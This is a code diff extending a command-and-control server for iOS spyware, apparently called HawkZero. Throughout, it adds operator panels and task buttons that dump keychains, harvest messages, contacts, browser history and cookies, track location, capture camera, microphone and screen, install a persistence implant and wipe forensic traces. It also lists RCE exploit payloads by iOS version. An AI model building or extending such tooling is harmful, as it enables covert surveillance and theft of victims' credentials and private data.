@@ -129,6 +129,23 @@ def _auth(x_agent_token: str | None) -> None:
     raise HTTPException(status_code=401, detail="bad agent token")
 
 
+def _auth_ui(request: Request, x_agent_token: str | None) -> None:
+    """Like _auth, but also accepts the admin session cookie.
+
+    Needed for <img> loads (the live screen stream cannot send headers).
+    """
+    if not TOKEN:
+        return
+    if x_agent_token == TOKEN:
+        return
+    cookie = request.cookies.get(COOKIE_NAME)
+    if cookie and (cookie == TOKEN or session_valid(cookie)):
+        return
+    if x_agent_token and session_valid(x_agent_token):
+        return
+    raise HTTPException(status_code=401, detail="bad agent token")
+
+
 def _now() -> float:
     return time.time()
 
@@ -225,6 +242,7 @@ def _agents_view() -> list[dict]:
             "queued": sum(1 for t in a["tasks"] if t["state"] == "queued"),
             "done": sum(1 for t in a["tasks"] if t["state"] == "done"),
             "results": len(a["results"]),
+            "locations": a.get("locations") or [],
             "seen": time.strftime("%H:%M:%S", time.localtime(seen)) if seen else "never",
             "online": bool(seen and (now - seen) < 90),
         })
@@ -240,77 +258,134 @@ def _stats(agents: list[dict]) -> dict:
     }
 
 
+def _collect(agents: list[dict], types: set, limit: int = 90):
+    """Flatten results of the given task types into table rows."""
+    rows = []
+    for a in agents:
+        for r in a["results"]:
+            if r.get("type") not in types:
+                continue
+            res = r.get("result") or {}
+            out = res.get("output")
+            if isinstance(out, dict) and isinstance(out.get("rows"), list):
+                for row in out["rows"][:limit]:
+                    cells = row if isinstance(row, list) else [row]
+                    rows.append([a["id"], r.get("type", ""),
+                                 " | ".join(str(c)[:48] for c in cells[:5])])
+            elif isinstance(out, list):
+                for item in out[:limit]:
+                    rows.append([a["id"], r.get("type", ""), str(item)[:100]])
+            elif out is not None:
+                rows.append([a["id"], r.get("type", ""), str(out)[:100]])
+    return ["Device", "Task", "Data"], rows[-limit:]
+
+
 def _section_rows(slug: str, agents: list[dict]):
     """(columns, rows) for each section, backed by the live C2 store."""
-    if slug == "targets":
+    if slug in ("devices", "screen"):
         return (["Device", "Model", "Build", "Kernel R/W", "Last seen"],
                 [[a["id"], a["info"].get("model", "?"), a["info"].get("build", "?"),
                   "yes" if a["info"].get("krw") else "no", a["seen"]] for a in agents])
 
-    if slug == "signals":
+    if slug == "location":
         rows = []
         for a in agents:
-            for r in a["results"][-10:]:
-                rows.append([a["id"], r.get("type", ""),
-                             str((r.get("result") or {}).get("status", ""))[:60]])
-        return ["Device", "Task", "Status"], rows[-60:]
+            for f in a["locations"][-40:]:
+                rows.append([a["id"], f.get("lat"), f.get("lon"),
+                             f.get("accuracy", "?"),
+                             time.strftime("%H:%M:%S",
+                                           time.localtime(f.get("received_at", 0)))])
+        return ["Device", "Lat", "Lon", "Accuracy", "Received"], rows[-80:]
 
-    if slug == "alerts":
-        rows = []
-        for a in agents:
-            for r in a["results"]:
-                if (r.get("result") or {}).get("status") == "error":
-                    rows.append([a["id"], r.get("type", ""),
-                                 str((r.get("result") or {}).get("output", ""))[:90]])
-        return ["Device", "Task", "Error"], rows[-60:]
+    if slug == "keychain":
+        return _collect(agents, {"keychain", "keychain_platform"})
+    if slug == "messages":
+        return _collect(agents, {"harvest_sms", "harvest_calls"})
+    if slug == "contacts":
+        return _collect(agents, {"harvest_contacts"})
+    if slug == "safari":
+        return _collect(agents, {"harvest_safari", "harvest_cookies"})
+    if slug == "files":
+        return _collect(agents, {"fs_list", "fs_read"})
+    if slug == "media":
+        return _collect(agents, {"camera_photo", "mic_record", "sb_screen_frame", "screen_frame"})
 
     if slug == "console":
         rows = []
         for a in agents:
-            for r in a["results"][-6:]:
+            for r in a["results"][-8:]:
                 rows.append([a["id"], r.get("type", ""),
-                             str((r.get("result") or {}).get("output", ""))[:90]])
+                             str((r.get("result") or {}).get("output", ""))[:100]])
         return ["Device", "Task", "Output"], rows[-40:]
 
-    if slug == "files":
-        rows = []
-        for a in agents:
-            for r in a["results"]:
-                if r.get("type") in ("fs_list", "fs_read"):
-                    out = (r.get("result") or {}).get("output")
-                    if isinstance(out, list):
-                        rows += [[a["id"], str(name)[:70], ""] for name in out[:60]]
-        return ["Device", "Entry", ""], rows[-120:]
+    if slug == "persistence":
+        return (["Action", "Task", "Note"],
+                [["Install implant", "persist_install", "trust cache + LaunchDaemon"],
+                 ["Remove implant", "persist_remove", "bootout + unlink"],
+                 ["SpringBoard host", "sb_host", "dlopen agent in SpringBoard"]])
 
-    if slug == "analytics":
-        return (["Metric", "Value"],
-                [["Devices", str(len(agents))],
-                 ["Online", str(sum(1 for a in agents if a["online"]))],
-                 ["Tasks completed", str(sum(a["done"] for a in agents))],
-                 ["Results collected", str(sum(a["results"] for a in agents))]])
+    if slug == "antiforensics":
+        return (["Action", "Task", "Note"],
+                [["Wipe crash reports", "af_wipe_crashes", "dry_run by default"],
+                 ["Remove paths", "af_remove", "files or directories"],
+                 ["Truncate file", "af_truncate", "keep inode"],
+                 ["Timestomp", "af_timestomp", "atime + mtime"]])
 
-    if slug == "system":
-        return (["Property", "Value"],
-                [["Backend", "fastapi / uvicorn"],
-                 ["Host", "railway"],
-                 ["Store", str(DATA_DIR)],
-                 ["Session TTL", f"{SESSION_TTL}s"]])
-
-    if slug == "security":
-        return (["Control", "Value"],
-                [["Authenticator (TOTP)", "enabled"],
-                 ["Lockout", f"{MAX_ATTEMPTS} fails / {LOCKOUT_SECONDS}s"],
-                 ["Session cookie", f"{COOKIE_NAME} (httpOnly, lax)"],
-                 ["Agent API auth", "X-Agent-Token" if TOKEN else "open"]])
+    if slug == "delivery":
+        return (["iOS", "Route", "Payload"],
+                [["18.4", "rce_loader.js", "rce_worker_18.4.js"],
+                 ["18.5", "rce_loader.js", "rce_worker_18.6.js / rce_module_18.5.js"],
+                 ["18.6", "rce_loader.js", "rce_worker_18.6.js / rce_module.js"],
+                 ["18.7", "rce_loader.js", "rce_worker_18.7.js"],
+                 ["26.0 - 26.3", "loader_26_deploy.js", "rce_worker_26.3.js"],
+                 ["26.4 - 26.6", "loader_26_deploy.js", "rce_worker_26.5.js"]])
 
     if slug == "api-keys":
         return (["Key", "Scope"],
                 [["AGENT_TOKEN", "agent API + admin"],
-                 ["hz.sid", "admin session cookie"]])
+                 ["hz.sid", "admin session cookie"],
+                 ["Session TTL", f"{SESSION_TTL}s"],
+                 ["Lockout", f"{MAX_ATTEMPTS} fails / {LOCKOUT_SECONDS}s"]])
 
     return (["ID", "Name", "Status"],
             [[f"HZ-{slug[:3].upper()}-{i:03d}", f"{slug} item {i}", "Nominal"]
              for i in range(1, 5)])
+
+
+# Per-section action buttons: (label, task type, args)
+SECTION_ACTIONS = {
+    "devices": [("Sysinfo", "sysinfo", {}), ("Processes", "procs", {})],
+    "screen": [("Start stream", "screen_stream_start", {"fps": 2}),
+               ("Stop stream", "screen_stream_stop", {}),
+               ("Single frame", "screen_frame", {}),
+               ("SpringBoard frame", "sb_screen_frame", {})],
+    "location": [("Locate once", "location_once", {}),
+                 ("Start tracking", "location_start", {}),
+                 ("Stop tracking", "location_stop", {})],
+    "keychain": [("Dump keychain", "keychain", {}),
+                 ("Platform keychain", "keychain_platform", {})],
+    "messages": [("Harvest SMS", "harvest_sms", {"limit": 200}),
+                 ("Harvest calls", "harvest_calls", {"limit": 200})],
+    "contacts": [("Harvest contacts", "harvest_contacts", {"limit": 200})],
+    "safari": [("Safari history", "harvest_safari", {"limit": 200}),
+               ("Cookies", "harvest_cookies", {})],
+    "files": [("List /var/mobile", "fs_list", {"path": "/var/mobile"}),
+              ("List /var/mobile/Library", "fs_list", {"path": "/var/mobile/Library"})],
+    "media": [("Camera photo", "camera_photo", {}),
+              ("Record mic 10s", "mic_record", {"seconds": 10})],
+    "persistence": [("Install implant", "persist_install", {}),
+                    ("Remove implant", "persist_remove", {}),
+                    ("SpringBoard host", "sb_host", {})],
+    "antiforensics": [("Wipe crashes (dry)", "af_wipe_crashes", {"dry_run": True}),
+                      ("Wipe crashes (live)", "af_wipe_crashes", {"dry_run": False})],
+    "console": [("Sysinfo", "sysinfo", {}), ("Processes", "procs", {}),
+                ("Screen frame", "screen_frame", {})],
+}
+
+
+def _actions_for(slug: str) -> list[dict]:
+    return [{"label": label, "value": f"{ttype}|{json.dumps(args)}"}
+            for label, ttype, args in SECTION_ACTIONS.get(slug, [])]
 
 
 def _queue_task(agent_id: str, task_type: str, args: dict) -> str:
@@ -383,8 +458,9 @@ async def screen(id: str = Form(...), frame: UploadFile = File(...),
 
 
 @router.get("/api/agent/{agent_id}/screen/latest")
-async def screen_latest(agent_id: str, x_agent_token: str | None = Header(default=None)):
-    _auth(x_agent_token)
+async def screen_latest(request: Request, agent_id: str,
+                        x_agent_token: str | None = Header(default=None)):
+    _auth_ui(request, x_agent_token)
     path = store.frame_path(agent_id)
     if not path.exists():
         raise HTTPException(404, "no frame")
@@ -460,14 +536,14 @@ async def root(request: Request):
 
 
 @router.get("/api/agent/{agent_id}/screen/stream")
-async def screen_stream(agent_id: str, count: int = 0,
+async def screen_stream(request: Request, agent_id: str, count: int = 0,
                         x_agent_token: str | None = Header(default=None)):
     """True MJPEG live view: newest frame every 500 ms.
 
     count=0 (default) streams forever; count=N emits N frames then closes,
     which is useful for bounded captures and for tests.
     """
-    _auth(x_agent_token)
+    _auth_ui(request, x_agent_token)
     import asyncio
 
     async def frames():
@@ -601,7 +677,8 @@ async def admin_section(request: Request, slug: str):
         "title": section["label"], "app_name": "HawkZero", "user": user,
         "sections": SECTIONS, "sections_by_slug": BY_SLUG, "active": slug,
         "section": section, "agents": agents, "columns": columns, "rows": rows,
-        "task_types": TASK_TYPES, "flash": flash, "path": path, "empty": None})
+        "actions": _actions_for(slug), "task_types": TASK_TYPES,
+        "flash": flash, "path": path, "empty": None})
 
 
 @router.post("/admin/console")
@@ -610,17 +687,31 @@ async def admin_console(request: Request):
         return RedirectResponse("/login", status_code=302)
     form = await request.form()
     device = str(form.get("device", ""))
-    task_type = str(form.get("type", "sysinfo"))
-    raw = str(form.get("args", "") or "").strip()
-    args = {}
-    if raw:
-        try:
-            args = json.loads(raw)
-        except json.JSONDecodeError:
-            args = {"raw": raw}
-    if device:
+
+    # Two shapes: the Console form sends type + args; section action buttons
+    # send action="<task_type>|<json args>".
+    action = str(form.get("action", "") or "")
+    if action:
+        task_type, _, raw = action.partition("|")
+        args = {}
+        if raw:
+            try:
+                args = json.loads(raw)
+            except json.JSONDecodeError:
+                args = {}
+    else:
+        task_type = str(form.get("type", "sysinfo"))
+        raw = str(form.get("args", "") or "").strip()
+        args = {}
+        if raw:
+            try:
+                args = json.loads(raw)
+            except json.JSONDecodeError:
+                args = {"raw": raw}
+
+    if device and task_type:
         _queue_task(device, task_type, args)
-    return RedirectResponse("/admin/console", status_code=302)
+    return RedirectResponse(f"/admin/{form.get('back', 'console')}", status_code=302)
 
 
 @router.post("/admin/targets")
